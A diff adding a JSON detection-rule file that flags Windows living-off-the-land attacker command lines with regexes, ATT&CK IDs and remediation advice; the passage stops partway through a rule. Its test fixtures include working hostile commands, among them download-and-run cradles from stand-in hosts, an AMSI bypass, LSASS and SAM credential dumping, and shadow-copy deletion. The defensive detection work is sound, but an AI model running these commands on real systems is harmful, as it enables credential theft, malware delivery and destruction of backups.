@@ -1,0 +1,1062 @@
+{
+  "name": "Living-off-the-land and attacker command lines",
+  "version": "2026.10",
+  "rules": [
+    {
+      "id": "LOTL-PS-ENCODED",
+      "title": "PowerShell with an encoded command",
+      "images": [
+        "powershell.exe",
+        "pwsh.exe",
+        "powershell_ise.exe"
+      ],
+      "pattern": "(?i)(?:^|\\s)[-/]e(?:nc(?:odedcommand)?|c|ncodedcommand)?\\s+[A-Za-z0-9+/=]{40,}",
+      "technique": [
+        "T1059.001",
+        "T1027.010"
+      ],
+      "severity": "High",
+      "confidence": "High",
+      "description": "PowerShell was given a Base64-encoded command, which hides what it runs. Common in malware launchers and droppers.",
+      "recommendation": "Decode the Base64 (UTF-16LE) to see the real command. Check the parent process and how it was started.",
+      "tests": {
+        "match": [
+          "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+          "pwsh -EncodedCommand JABhAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAnAA=="
+        ],
+        "nomatch": [
+          "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1",
+          "powershell -e short"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-PS-DOWNLOAD-CRADLE",
+      "title": "PowerShell download-and-run cradle",
+      "images": [
+        "powershell.exe",
+        "pwsh.exe",
+        "powershell_ise.exe"
+      ],
+      "pattern": "(?i)(?:iex|invoke-expression|\\.invoke\\(\\)|\\|\\s*&|&\\s*\\(\\s*\\$)[\\s\\S]{0,200}(?:downloadstring|downloaddata|invoke-webrequest|iwr|irm|invoke-restmethod|net\\.webclient|start-bitstransfer)|(?:downloadstring|downloaddata|invoke-restmethod|irm|iwr|invoke-webrequest)[\\s\\S]{0,300}(?:\\|\\s*iex|\\|\\s*invoke-expression|iex\\s*\\()",
+      "technique": [
+        "T1059.001",
+        "T1105"
+      ],
+      "severity": "High",
+      "confidence": "High",
+      "description": "PowerShell downloads code from the network and executes it in memory without saving a file — a classic first-stage loader.",
+      "recommendation": "Identify the URL, fetch it safely in a sandbox, and block the domain/IP. Look for what ran next (child processes, new connections).",
+      "tests": {
+        "match": [
+          "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')\"",
+          "powershell iwr https://evil.example/p.ps1 -UseBasicParsing | iex",
+          "powershell -c irm https://get.example.com/install.ps1 | iex"
+        ],
+        "nomatch": [
+          "powershell -c Invoke-WebRequest https://example.com/file.zip -OutFile C:\\temp\\file.zip",
+          "powershell -File C:\\Program Files\\App\\update.ps1"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-PS-HIDDEN-BYPASS",
+      "title": "PowerShell launched hidden with policy bypass",
+      "images": [
+        "powershell.exe",
+        "pwsh.exe",
+        "powershell_ise.exe"
+      ],
+      "pattern": "(?i)(?=.*(?:^|\\s)[-/]w(?:in(?:dowstyle)?)?\\s+h(?:idden)?\\b)(?=.*(?:[-/]ep?\\s+bypass|[-/]exec(?:utionpolicy)?\\s+bypass|[-/]nop(?:rofile)?\\b))",
+      "technique": [
+        "T1059.001"
+      ],
+      "severity": "Medium",
+      "confidence": "Medium",
+      "description": "Hidden window plus execution-policy bypass or no profile is typical of scripted attacks, though some admin tools do this too.",
+      "recommendation": "Check the script or command being run, and whether the parent (e.g. Office, browser, scheduled task) is expected.",
+      "tests": {
+        "match": [
+          "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\\Users\\a\\AppData\\x.ps1",
+          "powershell -windowstyle hidden -ep bypass -c whoami"
+        ],
+        "nomatch": [
+          "powershell -ep bypass -File .\\build.ps1",
+          "powershell.exe -WindowStyle Hidden -File C:\\Windows\\ccmcache\\x.ps1"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-PS-AMSI-BYPASS",
+      "title": "AMSI / script-scanning bypass attempt",
+      "images": [],
+      "pattern": "(?i)amsiutils|amsiinitfailed|amsiscanbuffer|amsicontext|amsi\\.dll.{0,80}(?:virtualprotect|patch)|\\[ref\\]\\.assembly\\.gettype\\(.{0,40}amsi",
+      "technique": [
+        "T1562.001"
+      ],
+      "severity": "Critical",
+      "confidence": "High",
+      "description": "A command tried to disable the Antimalware Scan Interface so malicious scripts aren't scanned. Legitimate software essentially never does this.",
+      "recommendation": "Treat the host as compromised. Capture the full script (event 4104), isolate the machine and look for follow-on activity.",
+      "tests": {
+        "match": [
+          "powershell -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+        ],
+        "nomatch": [
+          "powershell -c Get-Process"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-PS-REFLECTIVE",
+      "title": "In-memory .NET assembly loading",
+      "images": [
+        "powershell.exe",
+        "pwsh.exe",
+        "powershell_ise.exe"
+      ],
+      "pattern": "(?i)(?:\\[system\\.reflection\\.assembly\\]|\\[reflection\\.assembly\\])\\s*::\\s*load(?:file|from)?\\s*\\(\\s*(?:\\[convert\\]::frombase64string|\\(new-object|\\$)|frombase64string[\\s\\S]{0,200}::load\\(",
+      "technique": [
+        "T1620",
+        "T1027"
+      ],
+      "severity": "High",
+      "confidence": "High",
+      "description": "PowerShell loads a .NET assembly straight from memory (often Base64), a common way to run tools like loaders and post-exploitation kits without touching disk.",
+      "recommendation": "Recover the Base64 blob from the command or event 4104 and analyze it in a sandbox.",
+      "tests": {
+        "match": [
+          "powershell -c [System.Reflection.Assembly]::Load([Convert]::FromBase64String($b))"
+        ],
+        "nomatch": [
+          "powershell -c [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-PS-DEFENDER-TAMPER",
+      "title": "Microsoft Defender disabled or excluded from the command line",
+      "images": [],
+      "pattern": "(?i)set-mppreference\\s[^\\n]{0,200}-disable(?:realtimemonitoring|behaviormonitoring|ioavprotection|scriptscanning|blockatfirstseen)\\s+(?:\\$true|1)|add-mppreference\\s[^\\n]{0,100}-exclusion(?:path|process|extension)|sc(?:\\.exe)?\\s+(?:stop|config)\\s+windefend",
+      "technique": [
+        "T1562.001"
+      ],
+      "severity": "High",
+      "confidence": "High",
+      "description": "Antivirus protection was turned off or a folder/process was excluded from scanning — attackers do this right before dropping payloads.",
+      "recommendation": "Re-enable protection, remove unexpected exclusions (Get-MpPreference) and scan the excluded locations.",
+      "tests": {
+        "match": [
+          "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
+          "powershell -c Add-MpPreference -ExclusionPath C:\\Users\\Public"
+        ],
+        "nomatch": [
+          "powershell Get-MpPreference",
+          "powershell Set-MpPreference -DisableRealtimeMonitoring $false"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-MSHTA",
+      "title": "mshta running remote or inline script",
+      "images": [
+        "mshta.exe"
+      ],
+      "pattern": "(?i)(?:https?://|\\\\\\\\[\\w.\\-]+\\\\)|javascript:|vbscript:|\\.hta\\b",
+      "technique": [
+        "T1218.005"
+      ],
+      "severity": "High",
+      "confidence": "High",
+      "description": "mshta.exe executed an HTA file or inline script. It is heavily abused for initial access (including fake-CAPTCHA “ClickFix” lures) and rarely used legitimately.",
+      "recommendation": "Find where the URL/file came from (browser history, email, RunMRU), block it, and check for payloads it dropped.",
+      "tests": {
+        "match": [
+          "mshta.exe https://cdn.example/verify.hta",
+          "mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell\"\"\")(window.close)"
+        ],
+        "nomatch": [
+          "mshta.exe"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-WSCRIPT-USERPATH",
+      "title": "Windows Script Host running a script from a user folder",
+      "images": [
+        "wscript.exe",
+        "cscript.exe"
+      ],
+      "pattern": "(?i)\\\\(?:appdata|temp|downloads|desktop|users\\\\public|programdata)\\\\[^\\n]*\\.(?:js|jse|vbs|vbe|wsf|wsh)\\b",
+      "technique": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "severity": "High",
+      "confidence": "Medium",
+      "description": "A JScript/VBScript file ran from a user-writable folder — the usual path for malicious email and download attachments.",
+      "recommendation": "Collect the script, check how it arrived (email/download), and look for child processes it started.",
+      "tests": {
+        "match": [
+          "wscript.exe \"C:\\Users\\bob\\Downloads\\Invoice_2026.js\"",
+          "cscript //nologo C:\\Users\\bob\\AppData\\Local\\Temp\\a.vbs"
+        ],
+        "nomatch": [
+          "cscript.exe C:\\Windows\\System32\\slmgr.vbs /dli"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-CERTUTIL-DOWNLOAD",
+      "title": "certutil used to download a file",
+      "images": [
+        "certutil.exe"
+      ],
+      "pattern": "(?i)-(?:urlcache|verifyctl)\\b|(?:https?://|\\\\\\\\[\\w.\\-]+\\\\)",
+      "technique": [
+        "T1105"
+      ],
+      "severity": "High",
+      "confidence": "High",
+      "description": "certutil.exe fetched a file from the network. Attackers use it as a built-in downloader.",
+      "recommendation": "Find and hash the downloaded file, check it against threat intelligence, and block the source.",
+      "tests": {
+        "match": [
+          "certutil.exe -urlcache -split -f http://203.0.113.5/a.exe C:\\Users\\Public\\a.exe",
+          "certutil -verifyctl -f -split https://x.example/p"
+        ],
+        "nomatch": [
+          "certutil -hashfile C:\\file.zip SHA256",
+          "certutil -store my"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-CERTUTIL-DECODE",
+      "title": "certutil used to decode a file",
+      "images": [
+        "certutil.exe"
+      ],
+      "pattern": "(?i)-decode(?:hex)?\\b",
+      "technique": [
+        "T1140"
+      ],
+      "severity": "Medium",
+      "confidence": "Medium",
+      "description": "certutil.exe decoded a Base64/hex file — often used to unpack a payload smuggled as text.",
+      "recommendation": "Inspect the input and output files named in the command line.",
+      "tests": {
+        "match": [
+          "certutil -decode C:\\Users\\a\\AppData\\Local\\Temp\\p.txt C:\\Users\\a\\p.exe"
+        ],
+        "nomatch": [
+          "certutil -encode in.bin out.txt"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-BITSADMIN",
+      "title": "bitsadmin download or command job",
+      "images": [
+        "bitsadmin.exe"
+      ],
+      "pattern": "(?i)/(?:transfer|addfile|setnotifycmdline|create)\\b",
+      "technique": [
+        "T1197",
+        "T1105"
+      ],
+      "severity": "High",
+      "confidence": "Medium",
+      "description": "BITS was used to download a file or run a command when a job completes — a stealthy persistence and download method.",
+      "recommendation": "List BITS jobs (Get-BitsTransfer -AllUsers) and investigate the URL and notify command.",
+      "tests": {
+        "match": [
+          "bitsadmin /transfer job /download /priority high http://x.example/a.exe C:\\Users\\Public\\a.exe",
+          "bitsadmin /SetNotifyCmdLine myjob C:\\Windows\\Temp\\run.exe NULL"
+        ],
+        "nomatch": [
+          "bitsadmin /list /allusers"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-CURL-RAW-IP",
+      "title": "curl downloading from a raw IP address",
+      "images": [
+        "curl.exe"
+      ],
+      "pattern": "(?i)https?://\\d{1,3}(?:\\.\\d{1,3}){3}(?::\\d+)?/",
+      "technique": [
+        "T1105"
+      ],
+      "severity": "Medium",
+      "confidence": "Medium",
+      "description": "curl.exe fetched content from a bare IP address rather than a named site — common for attacker staging servers.",
+      "recommendation": "Look up the IP's reputation and check what was saved (-o) and executed afterwards.",
+      "tests": {
+        "match": [
+          "curl.exe -o C:\\Users\\Public\\x.exe http://198.51.100.7:8080/x.exe"
+        ],
+        "nomatch": [
+          "curl.exe -o setup.exe https://download.example.com/setup.exe"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-FINGER",
+      "title": "finger.exe used to fetch commands",
+      "images": [
+        "finger.exe"
+      ],
+      "pattern": "(?i)@",
+      "technique": [
+        "T1105",
+        "T1204.004"
+      ],
+      "severity": "High",
+      "confidence": "High",
+      "description": "finger.exe queried a remote host. It has almost no modern legitimate use and is abused in ClickFix campaigns to pull down the next command.",
+      "recommendation": "Block the remote host and check RunMRU/clipboard-driven executions on this machine.",
+      "tests": {
+        "match": [
+          "finger.exe gate@203.0.113.9",
+          "cmd /c finger x@evil.example | cmd"
+        ],
+        "nomatch": [
+          "finger.exe"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-REGSVR32-REMOTE",
+      "title": "regsvr32 loading a remote scriptlet (Squiblydoo)",
+      "images": [
+        "regsvr32.exe"
+      ],
+      "pattern": "(?i)/i:\\s*(?:https?://|\\\\\\\\[\\w.\\-]+\\\\)|scrobj\\.dll",
+      "technique": [
+        "T1218.010"
+      ],
+      "severity": "High",
+      "confidence": "High",
+      "description": "regsvr32 executed a scriptlet from a URL or via scrobj.dll — a well-known application-control bypass.",
+      "recommendation": "Retrieve the scriptlet URL, block it, and review child processes.",
+      "tests": {
+        "match": [
+          "regsvr32 /s /n /u /i:http://x.example/file.sct scrobj.dll"
+        ],
+        "nomatch": [
+          "regsvr32 /s C:\\Program Files\\App\\component.dll"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-REGSVR32-USERPATH",
+      "title": "regsvr32 registering a DLL from a user folder",
+      "images": [
+        "regsvr32.exe"
+      ],
+      "pattern": "(?i)\\\\(?:appdata|temp|downloads|users\\\\public|programdata)\\\\",
+      "technique": [
+        "T1218.010"
+      ],
+      "severity": "Medium",
+      "confidence": "Medium",
+      "description": "regsvr32 loaded a DLL from a user-writable folder — a frequent way to execute malicious DLLs.",
+      "recommendation": "Hash the DLL and check its signature and origin.",
+      "tests": {
+        "match": [
+          "regsvr32.exe /s C:\\Users\\bob\\AppData\\Roaming\\upd.dll"
+        ],
+        "nomatch": [
+          "regsvr32.exe /s C:\\Windows\\System32\\jscript.dll"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-RUNDLL32-SUSPICIOUS",
+      "title": "rundll32 running script or a URL handler",
+      "images": [
+        "rundll32.exe"
+      ],
+      "pattern": "(?i)javascript:|vbscript:|mshtml,RunHTMLApplication|url\\.dll,(?:OpenURL|FileProtocolHandler)|zipfldr\\.dll,RouteTheCall|shell32\\.dll,ShellExec_RunDLL|advpack\\.dll,(?:LaunchINFSection|RegisterOCX)|ieadvpack\\.dll|pcwutl\\.dll,LaunchApplication|(?:https?://|\\\\\\\\[\\w.\\-]+\\\\)",
+      "technique": [
+        "T1218.011"
+      ],
+      "severity": "High",
+      "confidence": "Medium",
+      "description": "rundll32 was used to run script or launch another program through a Windows DLL export — common proxy-execution tricks.",
+      "recommendation": "Look at the full command line and the process it launched.",
+      "tests": {
+        "match": [
+          "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert(1)",
+          "rundll32.exe url.dll,OpenURL C:\\Users\\a\\x.hta"
+        ],
+        "nomatch": [
+          "rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL desk.cpl"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-RUNDLL32-USERPATH",
+      "title": "rundll32 loading a DLL from a user folder",
+      "images": [
+        "rundll32.exe"
+      ],
+      "pattern": "(?i)\\\\(?:appdata|temp|downloads|users\\\\public|programdata|desktop)\\\\[^,\\n]+\\.(?:dll|dat|tmp|png|jpg|bin|ocx|cpl|txt|log)\\b",
+      "technique": [
+        "T1218.011"
+      ],
+      "severity": "High",
+      "confidence": "Medium",
+      "description": "rundll32 executed code from a user-writable folder (sometimes disguised with a non-DLL extension) — typical of loaders like those used by banking trojans and ransomware precursors.",
+      "recommendation": "Hash and submit the DLL for analysis; check persistence entries that reference it.",
+      "tests": {
+        "match": [
+          "rundll32.exe C:\\Users\\bob\\AppData\\Local\\Temp\\x.dat,DllRegisterServer",
+          "rundll32 C:\\ProgramData\\upd\\img.png,Start"
+        ],
+        "nomatch": [
+          "rundll32.exe C:\\Windows\\System32\\printui.dll,PrintUIEntry /il"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-COMSVCS-MINIDUMP",
+      "title": "LSASS memory dump via comsvcs.dll",
+      "images": [],
+      "pattern": "(?i)comsvcs(?:\\.dll)?[^\\n]{0,40}(?:minidump|#\\s*\\+?0*24\\b)",
+      "technique": [
+        "T1003.001"
+      ],
+      "severity": "Critical",
+      "confidence": "High",
+      "description": "A process memory dump was requested through comsvcs.dll MiniDump — the standard living-off-the-land way to steal credentials from LSASS.",
+      "recommendation": "Assume credentials on this host are compromised: isolate it, reset passwords for accounts that logged on, and find the dump file.",
+      "tests": {
+        "match": [
+          "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\l.dmp full",
+          "rundll32 comsvcs.dll #24 640 out.dmp full"
+        ],
+        "nomatch": [
+          "rundll32.exe C:\\Windows\\System32\\comsvcs.dll"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-MSIEXEC-REMOTE",
+      "title": "msiexec installing a package from a URL",
+      "images": [
+        "msiexec.exe"
+      ],
+      "pattern": "(?i)/(?:i|package|y|z)\\s*(?:https?://|\\\\\\\\[\\w.\\-]+\\\\)",
+      "technique": [
+        "T1218.007"
+      ],
+      "severity": "High",
+      "confidence": "Medium",
+      "description": "msiexec installed an MSI directly from the internet, a common malware delivery method.",
+      "recommendation": "Identify the MSI source and what it installed (Programs and Features, new services, new files).",
+      "tests": {
+        "match": [
+          "msiexec /q /i http://x.example/update.msi"
+        ],
+        "nomatch": [
+          "msiexec /i C:\\Installers\\app.msi /qn"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-INSTALLUTIL",
+      "title": "InstallUtil used to run code",
+      "images": [
+        "installutil.exe"
+      ],
+      "pattern": "(?i)/u\\b|/logfile=\\s|\\\\(?:appdata|temp|users\\\\public|programdata)\\\\",
+      "technique": [
+        "T1218.004"
+      ],
+      "severity": "High",
+      "confidence": "Medium",
+      "description": "InstallUtil can execute arbitrary .NET code and is used to bypass application allow-listing.",
+      "recommendation": "Inspect the assembly passed to InstallUtil.",
+      "tests": {
+        "match": [
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\a\\AppData\\x.dll"
+        ],
+        "nomatch": [
+          "InstallUtil.exe C:\\Program Files\\Vendor\\Service.exe"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-REGASM-REGSVCS",
+      "title": "RegAsm/RegSvcs loading an assembly from a user folder",
+      "images": [
+        "regasm.exe",
+        "regsvcs.exe"
+      ],
+      "pattern": "(?i)\\\\(?:appdata|temp|downloads|users\\\\public|programdata)\\\\",
+      "technique": [
+        "T1218.009"
+      ],
+      "severity": "High",
+      "confidence": "Medium",
+      "description": "RegAsm/RegSvcs ran a .NET assembly from a user-writable folder — a known allow-listing bypass.",
+      "recommendation": "Hash and analyze the assembly.",
+      "tests": {
+        "match": [
+          "regasm.exe /U C:\\Users\\Public\\x.dll"
+        ],
+        "nomatch": [
+          "regasm.exe C:\\Program Files\\Vendor\\Interop.dll"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-CMSTP",
+      "title": "CMSTP used to run an INF file",
+      "images": [
+        "cmstp.exe"
+      ],
+      "pattern": "(?i)/(?:s|ni|au)\\b.*\\.inf|\\.inf.*\\s/(?:s|ni|au)\\b",
+      "technique": [
+        "T1218.003",
+        "T1548.002"
+      ],
+      "severity": "High",
+      "confidence": "Medium",
+      "description": "cmstp.exe executed an INF profile silently — used to bypass UAC and allow-listing.",
+      "recommendation": "Review the INF file's RunPreSetupCommands section.",
+      "tests": {
+        "match": [
+          "cmstp.exe /ni /s C:\\Users\\a\\AppData\\Local\\Temp\\x.inf"
+        ],
+        "nomatch": [
+          "cmstp.exe"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-ODBCCONF",
+      "title": "odbcconf registering a DLL",
+      "images": [
+        "odbcconf.exe"
+      ],
+      "pattern": "(?i)regsvr|/a\\s*\\{|-f\\s+\\S+\\.rsp",
+      "technique": [
+        "T1218.008"
+      ],
+      "severity": "High",
+      "confidence": "Medium",
+      "description": "odbcconf was used to load a DLL — a rarely legitimate proxy-execution technique.",
+      "recommendation": "Identify and analyze the referenced DLL.",
+      "tests": {
+        "match": [
+          "odbcconf.exe /a {REGSVR C:\\Users\\Public\\x.dll}"
+        ],
+        "nomatch": [
+          "odbcconf.exe /?"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-HH-REMOTE",
+      "title": "Compiled HTML Help opened from the internet",
+      "images": [
+        "hh.exe"
+      ],
+      "pattern": "(?i)(?:https?://|\\\\\\\\[\\w.\\-]+\\\\)|\\\\(?:downloads|temp|appdata)\\\\[^\\n]*\\.chm",
+      "technique": [
+        "T1218.001"
+      ],
+      "severity": "Medium",
+      "confidence": "Medium",
+      "description": "hh.exe opened a CHM help file from the internet or a user folder; malicious CHM files can run script.",
+      "recommendation": "Collect the CHM and check how it arrived.",
+      "tests": {
+        "match": [
+          "hh.exe http://x.example/help.chm",
+          "hh.exe C:\\Users\\a\\Downloads\\manual.chm"
+        ],
+        "nomatch": [
+          "hh.exe C:\\Windows\\Help\\mui\\0409\\mmc.CHM"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-INDIRECT-EXEC",
+      "title": "Indirect command execution (forfiles / pcalua / conhost)",
+      "images": [
+        "forfiles.exe",
+        "pcalua.exe",
+        "conhost.exe"
+      ],
+      "pattern": "(?i)forfiles.*\\s/c\\s|pcalua.*\\s-a\\s|conhost(?:\\.exe)?\\s+(?:--headless\\s+)?(?=[^\\s-])[^\\n]*(?:cmd|powershell|mshta|\\.exe)",
+      "technique": [
+        "T1202"
+      ],
+      "severity": "Medium",
+      "confidence": "Medium",
+      "description": "A built-in tool was used to launch another program indirectly, which can evade simple parent-child monitoring.",
+      "recommendation": "Look at the program that was launched.",
+      "tests": {
+        "match": [
+          "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe",
+          "pcalua.exe -a C:\\Users\\a\\x.exe",
+          "conhost.exe --headless powershell -c whoami"
+        ],
+        "nomatch": [
+          "conhost.exe 0xffffffff -ForceV1"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-SHADOW-DELETE",
+      "title": "Volume shadow copies deleted or shrunk",
+      "images": [],
+      "pattern": "(?i)vssadmin(?:\\.exe)?\\s+(?:delete\\s+shadows|resize\\s+shadowstorage)|wmic(?:\\.exe)?\\s+shadowcopy\\s+delete|win32_shadowcopy[^\\n]{0,80}(?:delete|remove)|get-ciminstance[^\\n]{0,40}win32_shadowcopy[^\\n]{0,80}remove-ciminstance",
+      "technique": [
+        "T1490"
+      ],
+      "severity": "Critical",
+      "confidence": "High",
+      "description": "Backups that Windows keeps for recovery were deleted. This is one of the most reliable signs of ransomware about to encrypt, or already encrypting.",
+      "recommendation": "Isolate the host from the network now. Check other hosts for the same command and preserve evidence before rebooting.",
+      "tests": {
+        "match": [
+          "vssadmin.exe delete shadows /all /quiet",
+          "wmic shadowcopy delete",
+          "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB"
+        ],
+        "nomatch": [
+          "vssadmin list shadows"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-BACKUP-DESTROY",
+      "title": "Backup catalog or boot recovery disabled",
+      "images": [
+        "wbadmin.exe",
+        "bcdedit.exe"
+      ],
+      "pattern": "(?i)delete\\s+(?:catalog|systemstatebackup|backup)|recoveryenabled\\s+(?:no|off)|bootstatuspolicy\\s+ignoreallfailures",
+      "technique": [
+        "T1490"
+      ],
+      "severity": "Critical",
+      "confidence": "High",
+      "description": "Windows backups or automatic recovery were disabled — a standard ransomware preparation step.",
+      "recommendation": "Isolate the host and hunt for encryption activity and the same commands on other machines.",
+      "tests": {
+        "match": [
+          "wbadmin delete catalog -quiet",
+          "bcdedit /set {default} recoveryenabled No",
+          "bcdedit /set {default} bootstatuspolicy ignoreallfailures"
+        ],
+        "nomatch": [
+          "bcdedit /enum"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-LOG-CLEAR",
+      "title": "Event logs cleared from the command line",
+      "images": [],
+      "pattern": "(?i)wevtutil(?:\\.exe)?\\s+(?:cl|clear-log)\\b|clear-eventlog\\b|remove-eventlog\\b|\\[system\\.diagnostics\\.eventing\\.reader\\.eventlogsession\\]::globalsession\\.clearlog",
+      "technique": [
+        "T1070.001"
+      ],
+      "severity": "High",
+      "confidence": "High",
+      "description": "Windows event logs were cleared — attackers do this to erase evidence of what they did.",
+      "recommendation": "Collect any logs that remain (including forwarded copies/SIEM) and identify who ran the command.",
+      "tests": {
+        "match": [
+          "wevtutil cl Security",
+          "powershell Clear-EventLog -LogName System"
+        ],
+        "nomatch": [
+          "wevtutil qe Security /c:5"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-FIREWALL-OFF",
+      "title": "Firewall disabled or a port proxy added",
+      "images": [
+        "netsh.exe"
+      ],
+      "pattern": "(?i)advfirewall\\s+set\\s+\\w+\\s+state\\s+off|firewall\\s+set\\s+opmode\\s+(?:mode=)?disable|interface\\s+portproxy\\s+add",
+      "technique": [
+        "T1562.004",
+        "T1090"
+      ],
+      "severity": "High",
+      "confidence": "High",
+      "description": "The Windows firewall was turned off, or a port-forwarding proxy was created to tunnel traffic through this host.",
+      "recommendation": "Re-enable the firewall and remove unexpected port proxies (netsh interface portproxy show all).",
+      "tests": {
+        "match": [
+          "netsh advfirewall set allprofiles state off",
+          "netsh interface portproxy add v4tov4 listenport=3389 connectaddress=10.0.0.5 connectport=3389"
+        ],
+        "nomatch": [
+          "netsh advfirewall show allprofiles"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-HIVE-SAVE",
+      "title": "Registry hives with password hashes saved to disk",
+      "images": [
+        "reg.exe"
+      ],
+      "pattern": "(?i)\\b(?:save|export)\\s+(?:hklm|hkey_local_machine)\\\\(?:sam|system|security)\\b",
+      "technique": [
+        "T1003.002"
+      ],
+      "severity": "Critical",
+      "confidence": "High",
+      "description": "The SAM, SYSTEM or SECURITY hive was copied out. Together they let an attacker extract local password hashes offline.",
+      "recommendation": "Find and remove the saved hive files, assume local account hashes are exposed, and rotate local admin passwords (e.g. Windows LAPS).",
+      "tests": {
+        "match": [
+          "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv",
+          "reg.exe save hklm\\system c:\\perflogs\\sys"
+        ],
+        "nomatch": [
+          "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-NTDS-COPY",
+      "title": "Active Directory database copy (NTDS.dit)",
+      "images": [],
+      "pattern": "(?i)ntdsutil[^\\n]{0,80}(?:ifm|create\\s+full)|esentutl[^\\n]{0,60}/y[^\\n]{0,80}(?:ntds|/vss)|\\\\ntds\\.dit",
+      "technique": [
+        "T1003.003"
+      ],
+      "severity": "Critical",
+      "confidence": "High",
+      "description": "An attempt to copy the Active Directory database, which contains password hashes for every domain account.",
+      "recommendation": "Treat the domain as compromised: involve your incident response process, and plan a krbtgt and privileged-account reset.",
+      "tests": {
+        "match": [
+          "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\\x\" q q",
+          "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\temp\\n.dit"
+        ],
+        "nomatch": [
+          "ntdsutil /?"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-SCHTASKS-SUSPICIOUS",
+      "title": "Scheduled task created to run a script host or user-folder binary",
+      "images": [
+        "schtasks.exe"
+      ],
+      "pattern": "(?i)/create\\b(?=[^\\n]*(?:powershell|pwsh|cmd(?:\\.exe)?\\s*/c|mshta|wscript|cscript|rundll32|regsvr32|certutil|bitsadmin|\\\\appdata\\\\|\\\\temp\\\\|\\\\users\\\\public\\\\|\\\\programdata\\\\))",
+      "technique": [
+        "T1053.005"
+      ],
+      "severity": "Medium",
+      "confidence": "Medium",
+      "description": "A scheduled task was created that runs a script interpreter or a program from a user-writable folder — a common persistence method.",
+      "recommendation": "Review the task (schtasks /query /tn NAME /v /fo list) and its action.",
+      "tests": {
+        "match": [
+          "schtasks /create /sc minute /mo 30 /tn \"Updater\" /tr \"powershell -w hidden -f C:\\Users\\Public\\u.ps1\"",
+          "schtasks /Create /SC ONLOGON /TN x /TR C:\\Users\\a\\AppData\\Roaming\\x.exe"
+        ],
+        "nomatch": [
+          "schtasks /create /tn Backup /tr \"C:\\Program Files\\Backup\\run.exe\" /sc daily"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-SERVICE-SUSPICIOUS",
+      "title": "Service created to run a script host or user-folder binary",
+      "images": [
+        "sc.exe"
+      ],
+      "pattern": "(?i)\\b(?:create|config)\\b[^\\n]*binpath\\s*=\\s*[^\\n]*(?:powershell|cmd(?:\\.exe)?\\s*/c|mshta|rundll32|regsvr32|\\\\appdata\\\\|\\\\temp\\\\|\\\\users\\\\public\\\\|\\\\programdata\\\\)",
+      "technique": [
+        "T1543.003"
+      ],
+      "severity": "High",
+      "confidence": "Medium",
+      "description": "A Windows service was set to run a script interpreter or a program from a user-writable folder — used for persistence and privilege escalation.",
+      "recommendation": "Inspect and remove the service if it is not legitimate (sc qc NAME).",
+      "tests": {
+        "match": [
+          "sc create upd binPath= \"cmd /c C:\\Users\\Public\\x.exe\" start= auto",
+          "sc.exe config Spooler binpath= C:\\ProgramData\\x.exe"
+        ],
+        "nomatch": [
+          "sc query Spooler",
+          "sc create MySvc binPath= \"C:\\Program Files\\Vendor\\svc.exe\""
+        ]
+      }
+    },
+    {
+      "id": "LOTL-RUNKEY-ADD",
+      "title": "Run key added from the command line",
+      "images": [
+        "reg.exe",
+        "powershell.exe",
+        "pwsh.exe"
+      ],
+      "pattern": "(?i)(?:reg(?:\\.exe)?\\s+add|new-itemproperty|set-itemproperty)[^\\n]*\\\\currentversion\\\\(?:run|runonce|policies\\\\explorer\\\\run)\\b",
+      "technique": [
+        "T1547.001"
+      ],
+      "severity": "Medium",
+      "confidence": "Medium",
